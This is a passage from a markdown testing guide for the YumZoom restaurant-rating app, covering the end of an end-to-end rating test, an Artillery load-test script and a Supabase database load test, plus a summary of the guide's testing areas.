    await page.fill('[data-testid="family-review"]', 'Jake enjoyed it but wanted more toppings.');
    await page.click('[data-testid="submit-family-rating"]');
    
    // Rate for parent
    await page.click('[data-testid="rate-restaurant-button"]');
    await page.click('[data-testid="rating-star-8"]');
    await page.fill('[data-testid="review-text"]', 'Great family atmosphere, kids were happy and food was good quality.');
    await page.click('[data-testid="submit-rating"]');
    
    // Step 6: View Family Rating History
    await page.goto('/profile/ratings');
    await expect(page.locator('[data-testid="family-rating-card"]')).toHaveCount(3);
    
    // Step 7: Get Family-Friendly Recommendations
    await page.goto('/recommendations');
    await expect(page.locator('[data-testid="family-recommendation"]')).toHaveCount.greaterThan(0);
    
    console.log('✅ Complete family rating journey test passed');
  });
});
```

---

## Load Testing

### Step 1: Comprehensive Load Testing

#### 1.1 Production Load Test Script
```bash
#!/bin/bash
# scripts/run-load-tests.sh

echo "🚀 Starting YumZoom Load Testing Suite"

# Install Artillery if not present
if ! command -v artillery &> /dev/null; then
    echo "Installing Artillery..."
    npm install -g artillery
fi

# Run different load test scenarios
echo "📊 Running load test scenarios..."

# Light load test
echo "1. Light load (5 users/second for 2 minutes)"
artillery run tests/performance/light-load.yml --output light-load-report.json

# Medium load test
echo "2. Medium load (20 users/second for 5 minutes)"
artillery run tests/performance/medium-load.yml --output medium-load-report.json

# Heavy load test
echo "3. Heavy load (50 users/second for 10 minutes)"
artillery run tests/performance/heavy-load.yml --output heavy-load-report.json

# Spike test
echo "4. Spike test (100 users/second for 1 minute)"
artillery run tests/performance/spike-load.yml --output spike-load-report.json

# Generate HTML reports
echo "📈 Generating load test reports..."
artillery report light-load-report.json --output reports/light-load-report.html
artillery report medium-load-report.json --output reports/medium-load-report.html
artillery report heavy-load-report.json --output reports/heavy-load-report.html
artillery report spike-load-report.json --output reports/spike-load-report.html

echo "✅ Load testing completed. Reports available in ./reports/ directory"

# Check if any tests failed
if [ $? -eq 0 ]; then
    echo "🎉 All load tests passed!"
else
    echo "❌ Some load tests failed. Check the reports for details."
    exit 1
fi
```

#### 1.2 Database Load Testing
```typescript
// tests/performance/database-load.test.ts
import { createClient } from '@supabase/supabase-js';
import { performance } from 'perf_hooks';

async function runDatabaseLoadTest() {
  console.log('💾 Starting database load testing...');
  
  const supabase = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!
  );
  
  const tests = [
    {
      name: 'Restaurant Search Load',
      test: async () => {
        const promises = Array.from({ length: 100 }, async (_, i) => {
          const start = performance.now();
          const { data, error } = await supabase
            .rpc('nearby_restaurants_optimized', {
              lat: 40.7128 + (Math.random() - 0.5) * 0.1,
              lng: -74.0060 + (Math.random() - 0.5) * 0.1,
              distance_km: 10,
              limit_count: 20
            });
          const duration = performance.now() - start;
          
          return { success: !error, duration, results: data?.length || 0 };
        });
        
        return Promise.all(promises);
      }
    },
    {
      name: 'Rating Insertion Load',
      test: async () => {
        // Get some restaurant IDs first
        const { data: restaurants } = await supabase
          .from('restaurants')
          .select('id')
          .limit(10);
        
        const promises = Array.from({ length: 50 }, async (_, i) => {
          const start = performance.now();
          const restaurantId = restaurants![i % restaurants!.length].id;
          
          const { error } = await supabase
            .from('ratings')
            .insert({
              restaurant_id: restaurantId,
              user_id: 'test-user-id',
              rating: Math.floor(Math.random() * 10) + 1,
              review_text: `Load test rating ${i}`,
              status: 'published'
            });
          
          const duration = performance.now() - start;
          return { success: !error, duration };
        });
        
        return Promise.all(promises);
      }
    }
  ];
  
  for (const test of tests) {
    console.log(`\nRunning ${test.name}...`);
    const start = performance.now();
    
    try {
      const results = await test.test();
      const totalDuration = performance.now() - start;
      
      const successCount = results.filter(r => r.success).length;
      const averageDuration = results.reduce((sum, r) => sum + r.duration, 0) / results.length;
      const maxDuration = Math.max(...results.map(r => r.duration));
      const minDuration = Math.min(...results.map(r => r.duration));
      
      console.log(`✅ ${test.name} Results:`);
      console.log(`  Total Duration: ${totalDuration.toFixed(2)}ms`);
      console.log(`  Success Rate: ${successCount}/${results.length} (${(successCount/results.length*100).toFixed(2)}%)`);
      console.log(`  Average Response Time: ${averageDuration.toFixed(2)}ms`);
      console.log(`  Min Response Time: ${minDuration.toFixed(2)}ms`);
      console.log(`  Max Response Time: ${maxDuration.toFixed(2)}ms`);
      
      // Check against performance thresholds
      if (averageDuration > 1000) { // 1 second threshold
        console.log(`⚠️  Average response time exceeded threshold: ${averageDuration.toFixed(2)}ms > 1000ms`);
      }
      
      if (successCount / results.length < 0.95) { // 95% success rate threshold
        throw new Error(`Success rate below threshold: ${(successCount/results.length*100).toFixed(2)}% < 95%`);
      }
      
    } catch (error) {
      console.error(`❌ ${test.name} failed:`, error);
      throw error;
    }
  }
  
  console.log('\n🎉 All database load tests passed!');
}

if (require.main === module) {
  runDatabaseLoadTest().catch(console.error);
}
```

---

## Summary

This comprehensive testing and verification guide covers:

✅ **Deployment Verification**: Health checks, database connectivity, Redis operations
✅ **Smoke Testing**: Critical user flows and API endpoints
✅ **Integration Testing**: Third-party services (Google Maps, Stripe, Email)
✅ **Performance Testing**: Load testing, response times, resource usage
✅ **Security Testing**: OWASP ZAP scans, input validation, CSRF protection
✅ **User Acceptance Testing**: Complete family rating workflows
✅ **Load Testing**: Database performance under high concurrent load

## Next Steps

Continue with **Part 5: Monitoring & Maintenance** for ongoing production operations.

---

## Version Information

- **Testing Guide Part 4 Version**: 1.0
- **Test Coverage**: End-to-end production validation
- **Performance Budgets**: Defined and enforced
- **Last Updated**: August 2025

---

*For testing support, contact our QA team at qa@yumzoom.com*
